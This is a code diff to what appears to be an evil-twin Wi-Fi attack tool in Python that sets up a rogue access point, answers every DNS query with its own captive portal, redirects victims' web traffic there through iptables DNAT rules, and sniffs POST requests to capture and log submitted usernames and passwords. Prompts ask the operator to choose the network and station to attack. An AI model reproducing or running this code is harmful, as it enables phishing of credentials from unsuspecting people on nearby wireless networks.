@@ -3,7 +3,7 @@ import fcntl
 import os
 import signal
 import sys
-
+import urllib.parse
 import getmac
 from getmac import get_mac_address
 from progress.bar import IncrementalBar, ShadyBar, PixelBar, Bar, FillingSquaresBar, ChargingBar, FillingCirclesBar
@@ -11,7 +11,6 @@ from progress.spinner import Spinner, MoonSpinner, PixelSpinner, PieSpinner, Lin
 from scapy.all import *
 import time
 import netifaces
-import http.server
 from scapy.layers.dhcp import DHCP
 from scapy.layers.dot11 import Dot11, Dot11Elt, RadioTap, Dot11Deauth, Dot11Beacon, Dot11ProbeResp, Dot11ProbeReq
 from scapy.layers.http import HTTPRequest
@@ -187,7 +186,7 @@ def sniffer(iface, ch):
     while True:
         os.system("iwconfig " + iface + " channel " + str(from_ch))  # switch channel
         from_ch = from_ch % to_ch + 1
-        sniff(prn=handler, iface=iface, timeout=1, monitor=True)
+        sniff(prn=handler, iface=iface, timeout=1)
         if time.time() > timeout:
             break
 
@@ -274,23 +273,23 @@ def configDnsmasq(iface):
     dnsmasqConfig = ''
     print('[+] Configuring dnsmasq...')
     dnsmasqConfig += 'interface=' + iface + '\n'  # Interface in which dnsmasq listen
-    dnsmasqConfig += 'dhcp-range=10.0.0.10,10.0.0.250,255.255.255.0,12h\n'  # Range of IPs to set to clients for the DHCP server
-    dnsmasqConfig += 'dhcp-option=3,10.0.0.1\n'  # Set router to 10.0.0.1
-    dnsmasqConfig += 'dhcp-option=6,10.0.0.1\n'  # Set dns server to 10.0.0.1
-    dnsmasqConfig += 'address=/#/10.0.0.1\n'  # Response to every DNS query with 10.0.0.1 (where our captive portal is)
+    dnsmasqConfig += 'dhcp-range=192.168.1.10,192.168.1.250,255.255.255.0,12h\n'  # Range of IPs to set to clients for the DHCP server
+    dnsmasqConfig += 'dhcp-option=3,192.168.1.1\n'  # Set router to 192.168.1.1
+    dnsmasqConfig += 'dhcp-option=6,192.168.1.1\n'  # Set dns server to 192.168.1.1
+    dnsmasqConfig += 'address=/#/192.168.1.1\n'  # Response to every DNS query with 192.168.1.1 (where our captive portal is)
     dnsmasqConfig += 'address=/www.google.com/216.58.209.2\n'
     f = open(dnsmasqConfigFile, 'w')
     f.write(dnsmasqConfig)
     f.close()
 
-    # Set inet address of interface to 10.0.0.1
-    os.system('ifconfig ' + iface + ' 10.0.0.1 netmask 255.255.255.0')
+    # Set inet address of interface to 192.168.1.1
+    os.system('ifconfig ' + iface + ' 192.168.1.1 netmask 255.255.255.0')
     # route http traffic to captive portal page
     os.system(
-        'sudo iptables -t nat -A PREROUTING -p tcp -m tcp -s 10.0.0.0/24 --dport 80 -j DNAT --to-destination 10.0.0.1')
+        'sudo iptables -t nat -A PREROUTING -p tcp -m tcp -s 192.168.1.0/24 --dport 80 -j DNAT --to-destination 192.168.1.1')
     # route https traffic to captive portal page
     os.system(
-        'sudo iptables -t nat -A PREROUTING -p tcp -m tcp -s 10.0.0.0/24 --dport 443 -j DNAT --to-destination 10.0.0.1')
+        'sudo iptables -t nat -A PREROUTING -p tcp -m tcp -s 192.168.1.0/24 --dport 443 -j DNAT --to-destination 192.168.1.1')
     # Initialize dnsmasq
     os.system('dnsmasq -C ' + dnsmasqConfigFile)
     print('[+] dnsmasq successfully configured')
@@ -315,7 +314,7 @@ def config_portal():
     print('[+] apache2 configured successfully\n')
 
 
-def dhcp_handler(pkt):
+def station_handler(pkt):
     global connected_stations
     # dhcp offer:
     if DHCP in pkt and pkt[DHCP].options[0][1] == 2 and pkt.getlayer(Ether).dst not in connected_stations:
@@ -323,18 +322,15 @@ def dhcp_handler(pkt):
         print("[+]", pkt.getlayer(Ether).dst, " has connected to our access point")
 
     if pkt.haslayer(HTTPRequest):
-        if pkt.haslayer(Ether):
-            pkt.getlayer(Ether).dst == victim
-            packet = str(pkt)
-
-            if packet.find('POST'):
-                print("[+] ", pkt.getlayer(Ether).src, " has submitted his username and password "
-                                                       "check /var/www/html/captiveportal/passwords.txt")
-
+        method = pkt[HTTPRequest].Method.decode()
+        if method == 'POST' and pkt.haslayer(Raw):
+            if 'Uname' in str(pkt[Raw].load) and 'Pass' in str(pkt[Raw].load):
+                print("[+] ", pkt.getlayer(Ether).src, " has logged in " + str(urllib.parse.parse_qs(pkt[Raw].load)) +
+                                                       " added to /var/www/html/captiveportal/passwords.txt")
 
 
 def sniff_dhcp(iface):
-    sniff(iface=iface, filter='http or (udp and (port 67 or port 68))', prn=dhcp_handler)
+    sniff(iface=iface, filter='port 80 or (udp and (port 67 or port 68))', prn=station_handler)
 
 
 def sig_handler(signum, frame):
@@ -345,7 +341,7 @@ def sig_handler(signum, frame):
         os.system("killall hostapd")
         os.system('iptables -F')
         os.system('iptables -t nat -F')
-        os.system("ifconfig " + str(interface) + " 10.0.0.12")
+        # os.system("ifconfig " + str(interface) + " 10.0.0.12")
         os.system("rm dnsmasq.conf")
         os.system("rm hostapd.conf")
         sys.exit()
@@ -374,8 +370,14 @@ if __name__ == "__main__":
     os.system('clear')
     output()
     network = input("enter the mac address of the network you want to attack: ")
+
+    while network.lower() not in AP:
+        network = input("AP not found choose one form the list please: ")
+
     output_client(network)
     victim = input("enter the mac address of the station you want to attack: ")
+    while victim.lower() not in client_AP:
+        victim = input("station not found choose one from the list please: ")
     time.sleep(1)
     config_portal()
     time.sleep(1)
@@ -385,7 +387,5 @@ if __name__ == "__main__":
     configDnsmasq(interface)
     time.sleep(1)
     signal.signal(signal.SIGINT, sig_handler)
+    print("[+]scanning our access point's stations activity if you want to stop press ctrl-c...")
     sniff_dhcp(interface)
-
-
-
